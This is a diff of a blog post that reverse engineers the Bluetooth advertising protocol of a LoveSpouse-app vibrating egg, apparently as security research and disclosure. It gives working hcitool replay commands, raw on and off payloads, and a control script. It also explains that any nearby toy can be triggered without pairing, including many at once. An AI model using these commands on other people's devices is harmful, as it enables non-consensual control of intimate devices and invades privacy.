@@ -5,49 +5,50 @@ categories: [IoT]
 tags: [bluetooth, reverse-engineering, BLE, IoT]
 ---
 
-# Lovespouse BLE reverse
+# LoveSpouse BLE Reverse
 
 ## Context
 
-Most entry-level and mid-range sex toys are vulnerable to unauthenticated Bluetooth packet injection attacks. 
-The reverse engineering of Bluetooth communications between the LoveSpouse mobile app and the vibrator will be the main focus of this article.
+Most entry-level and mid-range sex toys are vulnerable to unauthenticated Bluetooth packet injection attacks.
+This article focuses on reverse engineering the Bluetooth communication between the LoveSpouse mobile app and a vibrator.
 
 ![alt](/assets/img/posts/lovespouse-ble-reverse/love-spouse-classic-mode.png){: width="400" .center}
 
-The sex toy tested is the "Vibrating Egg Vibrator" from the brand "Kaiagame".
-The different vibration modes are manageable from a small Bluetooth remote control or from the Love Spouse application.
+The device tested is the "Vibrating Egg Vibrator" from the brand "Kaiagame".
+The different vibration modes can be controlled from a small Bluetooth remote or from the Love Spouse app.
 
-When powering on the vibrating egg to pair it with the mobile application, it is surprising not to see any new device in the Bluetooth networks. 
-It is very common (though not mandatory) for devices to enter discoverable mode during pairing.
-Moreover, when attempting to pair the sex toy with the application, even though it is powered off, no error is displayed on the Android application and we can select a vibration mode despite it not being paired with the phone.
+When powering on the vibrating egg to pair it with the app, it's surprising to see no new device appear in the Bluetooth network list.
+Devices usually enter discoverable mode during pairing, though this isn't required.
+Also, when trying to pair the sex toy with the app while it's powered off, no error shows up and you can still select a vibration mode even though nothing is connected.
 
 ![alt](/assets/img/posts/lovespouse-ble-reverse/false-connection.png){: width="400" .center}
 
-This suggests that it's not necessary to pair the sex toy with the phone to control it.
-This repository will first analyze communications between the adult toy and the phone. In a second phase, we will replay the communications from a laptop running Debian 12.
+This suggests that pairing the sex toy with the phone is not needed to control it.
+This article first analyzes communication between the toy and the phone. Then we replay those communications from a laptop running Debian 12.
 
 ---
 
 ## Bluetooth Communication Analysis
 
-To analyze Bluetooth communications between my vibrator, we will download the Love Spouse application APK and use it on an AVD (Android Virtual Device).
-We can download the APK from the Uptodown website:
+To analyze Bluetooth communications from the vibrator, we download the Love Spouse APK and run it on an AVD (Android Virtual Device).
+You can get the APK from Uptodown:
 
 <a href="https://love-spouse.en.uptodown.com/android">https://love-spouse.en.uptodown.com/android</a>
 
-Note that the tested version is `1.8.9`.
+The tested version is `1.8.9`.
 
-In the following steps, it's important to enable developer mode and ADB over WiFi on our virtual device.
-The application installation is straightforward with this command:
+Enable developer mode and ADB over WiFi on the virtual device.
+Install the app with:
+
 ```
 adb install love-spouse-1-8-9.apk
 ```
 
-### How does the phone send commands to the sex toy?
+### How does the phone send commands to the toy?
 
 **Controlling the vibrating egg**
 
-Press each of the vibration modes (9) and request a bugreport. This will contain Bluetooth logs that we will analyze.
+Press each of the 9 vibration modes, then request a bug report. It will contain Bluetooth logs for us to analyze.
 
 ![alt](/assets/img/posts/lovespouse-ble-reverse/love-spouse-classic-mode.png){: width="400" .center}
 
@@ -55,24 +56,22 @@ Press each of the vibration modes (9) and request a bugreport. This will contain
 adb bugreport bugreport.zip
 ```
 
-
 **Extract Bluetooth logs**
 
 ```
 unzip bugreport.zip "*/btsnooz_hci.log"
 ```
 
-First, we open it with Wireshark. We can observe many advertising packets sent by our phone. These don't contain the usual information.
+Open the file in Wireshark. You'll see many advertising packets sent by the phone. They don't contain the usual information.
 
 ![alt](/assets/img/posts/lovespouse-ble-reverse/wireshark-hci.png){: width="950" .center}
 
-We will formulate the following hypothesis: 
-> vibration commands are sent in advertising packets. 
- 
-This explains why there is seemingly no pairing with the phone.
+Our hypothesis:
+> Vibration commands are sent inside advertising packets.
 
-To extract these packets, we will use `tshark` and filter to retrieve only opcodes of type `0x2037`. These correspond to advertising data packets.
+This explains why there's no apparent pairing with the phone.
 
+To extract these packets, use `tshark` and filter for opcodes of type `0x2037`. These correspond to advertising data packets.
 
 ```
 tshark -r btsnooz_hci.log -Y "bthci_cmd.opcode == 0x2037"                      
@@ -88,8 +87,9 @@ tshark -r btsnooz_hci.log -Y "bthci_cmd.opcode == 0x2037"
   291  25.803601         host → controller   HCI_CMD 30 Sent LE Set Extended Advertising Data
 ```
 
-We have been retrieved 10 interesting packets. We pressed each mode, then pressed mode 10 twice to turn off the vibrating egg. Pressing one of the mode a second time sends a  turn off command.
-We can now display the raw content of packet number 1 and the second press on mode 10 to have a method to turn off the vibrator:
+We got 10 interesting packets. We pressed each mode once, then pressed mode 10 twice to turn off the egg (pressing a mode a second time sends a turn-off command).
+
+Let's display the raw content of packet 1 and the second press on mode 10 (turn off):
 
 ```
 tshark -r btsnooz_hci.log -Y "frame.number == 165" -x 
@@ -103,12 +103,12 @@ tshark -r btsnooz_hci.log -Y "frame.number == 291" -x
 0010  b6 43 ce 97 fe 42 7c e5 15 7d 03 03 8f ae         .C...B|..}....
 ```
 
-The only differences between these packets are at bytes 24,25 and 26 of each frame:
+The only differences between these packets are at bytes 24, 25 and 26:
 
 To activate mode 1: `e4 9c 6c`
-To turn off the vibrator: `e5 15 7d`
+To turn off: `e5 15 7d`
 
-For the other modes, we have:
+For the other modes:
 
 ```
 1 - e4 9c 6c 
@@ -124,33 +124,35 @@ For the other modes, we have:
 
 ---
 
-## Replay Bluetooth Communications
+## Replaying Bluetooth Communications
 
 ### Manually
 
-We can try to directly replay mode 1 with the `hcitool` command:
+Let's try to directly replay mode 1 with the `hcitool` command.
 
-Before if you haven't already done so. You must install bluez.
+First, install bluez if you haven't already:
+
 ```
 sudo apt update
 sudo apt install bluez
 ```
+
 ```
 sudo hciconfig hci0 down
 sudo hciconfig hci0 up
 sudo hcitool -i hci0 cmd 0x08 0x0037 00 03 01 16 02 01 01 0e ff ff 00 6d b6 43 ce 97 fe 42 7c e4 9c 6c 03 03 8f ae
 ```
 
-If we do this, the sex toy does not vibrate.
+If we do this, the toy doesn't vibrate.
 
 Two things are missing:
 
-- Configure advertising parameters (general parameters + MAC address)
-- Enable advertising with the previously configured parameters + send the packet
+- Configure advertising parameters (general settings + MAC address)
+- Enable advertising with those parameters and send the packet
 
-**Find advertissing settings**
+**Find advertising settings**
 
-To find this information, we can use opcode `0x2036` for general parameters:
+Use opcode `0x2036` for general parameters:
 
 ```
 tshark -r btsnooz_hci.log -Y "bthci_cmd.opcode == 0x2036" 
@@ -166,11 +168,9 @@ tshark -r btsnooz_hci.log -Y "bthci_cmd.opcode == 0x2036"
   285  25.796163         host → controller   HCI_CMD 29 Sent LE Set Extended Advertising Parameters
 ```
 
-These parameters appear before each advertising data packet. For example, the first packet was at frame `165`, and we have a parameter packet at frame `159`. 
+These parameters appear before each advertising data packet. For example, the first data packet is at frame `165` and its parameter packet is at frame `159`. Same for the last data packet (turn off) at frame `291` with parameters at `285`.
 
-Similarly for the last data packet (turn off) which was at frame `291` with a parameter packet at `285`.
-
-Let's now display the payload (which is always the same regardless of the selected packet):
+Let's display the payload (it's always the same regardless of which packet):
 
 ```
 tshark -r btsnooz_hci.log -Y "bthci_cmd.opcode == 0x2036" -x
@@ -178,9 +178,9 @@ tshark -r btsnooz_hci.log -Y "bthci_cmd.opcode == 0x2036" -x
 0010  00 00 00 00 00 00 00 01 01 00 01 00 00            .............
 ```
 
-**Find random MAC address**
+**Find the random MAC address**
 
-To find the device's MAC address, opcode `0x2035` will be useful:
+Use opcode `0x2035` to find the MAC address:
 
 ```
 tshark -r btsnooz_hci.log -Y "bthci_cmd.opcode == 0x2035" -x
@@ -196,13 +196,13 @@ tshark -r btsnooz_hci.log -Y "bthci_cmd.opcode == 0x2035" -x
 0000  01 35 20 07 00 fb 8f 75 5d 97 61                  .5 ....u].a
 ```
 
-With each new transmission, there is a new MAC address. The sex toy listens passively to everything happening on advertising. We can use a d  random MAC address and the vibrator will still activate.
+A new MAC address is used with each transmission. The toy passively listens to everything happening on advertising channels. We can use any random MAC address and the vibrator will still respond.
 
-**Final Payload - Activate Mode 1**
+**Final Payload — Activate Mode 1**
 
-We now have everything needed to make our adult toy vibrate.
+We now have everything needed to make the toy vibrate.
 
-In the final script, one last paquet has been added. It allows you to activate and send advertising from Bluez.
+In the final script, one last packet has been added to enable and send advertising from Bluez.
 
 ```
 sudo hciconfig hci0 down
@@ -213,16 +213,17 @@ sudo hcitool -i hci0 cmd 0x08 0x0037 00 03 01 16 02 01 01 0e ff ff 00 6d b6 43 c
 sudo hcitool -i hci0 cmd 0x08 0x0039 01 01 00 00 00 00 00 00 00 00
 ```
 
-Once these commands are sent, the vibrating egg starts vibrating on mode 1.
+After sending these commands, the vibrating egg starts vibrating on mode 1.
 
-**Final Payload - Turn Off the sex toy**
+**Final Payload — Turn Off**
 
-In addition to the payload shutdown, we need to add the last packet sent after a sleep allows stopping advertising transmission
+In addition to the shutdown payload, a final packet sent after a short sleep stops the advertising transmission:
+
 ```
 sudo hcitool -i hci0 cmd 0x08 0x0039 00 00 00 00 00 00 00 00 00 00
 ```
 
-To turn off the device, we can send the following commands:
+To turn off the device:
 
 ```
 sudo hcitool -i hci0 cmd 0x08 0x0037 00 03 01 16 02 01 01 0e ff ff 00 6d b6 43 ce 97 fe 42 7c e5 15 7d 03 03 8f ae
@@ -231,9 +232,9 @@ sleep 2
 sudo hcitool -i hci0 cmd 0x08 0x0039 00 00 00 00 00 00 00 00 00 00
 ```
 
-### Script final
+### Final Script
 
-Here is the Python script I wrote so that I can easily control the vibrations of my sex toys.
+Here is the Python script I wrote to easily control the vibrations.
 
 ```py
 import subprocess
@@ -308,9 +309,9 @@ if __name__ == "__main__":
                 if 0 <= mode <= 9:
                     send_mode(mode)
                 else:
-                    print("[!] Please enter an order between 0 and 9")
+                    print("[!] Please enter a number between 0 and 9")
             else:
-                print("[!] Please enter an order between 0 and 9")
+                print("[!] Please enter a number between 0 and 9")
         
         except (KeyboardInterrupt, EOFError):
             print()
@@ -321,12 +322,14 @@ if __name__ == "__main__":
             break   
 ```
 
-We need bluez to make our script work:
+You need bluez to run this script:
+
 ```
 sudo apt update
 sudo apt install bluez
 ```
-Running our script requires root privileges.
+
+Running the script requires root privileges.
 
 ![alt](/assets/img/posts/lovespouse-ble-reverse/poc-control.png){: width="950" .center}
 
@@ -336,11 +339,12 @@ Running our script requires root privileges.
 
 ### Security Implications
 
-Most cheap Bluetooth sex toys are built on the same model and share this vulnerability. 
+Most cheap Bluetooth sex toys are built on the same model and share this vulnerability.
 
-This protocol has been publicly reverse-engineered for at least two years, yet companies manufacturing these adult toys have not issued any security patches or design changes. 
+This protocol has been publicly reverse-engineered for at least two years, yet the manufacturers have not issued any security patches or made any design changes.
 
 ### Privacy Concerns
+
 Advertising packets are unencrypted and broadcast on BLE channels 37, 38, and 39. Anyone with a Bluetooth sniffer can:
 
 - Detect when someone is using a sex toy
@@ -348,8 +352,8 @@ Advertising packets are unencrypted and broadcast on BLE channels 37, 38, and 39
 
 ### Mass Control Attack
 
-If this script is executed in a location where multiple vulnerable vibrating egg are present, all devices within range will simultaneously respond to the selected mode. 
+If this script is run in a location where multiple vulnerable vibrating eggs are present, all devices within range will respond to the selected mode at the same time.
 
-The lack of device-specific addressing means a single broadcast packet controls every listening device indiscriminately.
+The lack of device-specific addressing means a single broadcast packet controls every listening device at once.
 
-**This represents a privacy and security risk for users of these devices.**
+**This is a real privacy and security risk for users of these devices.**
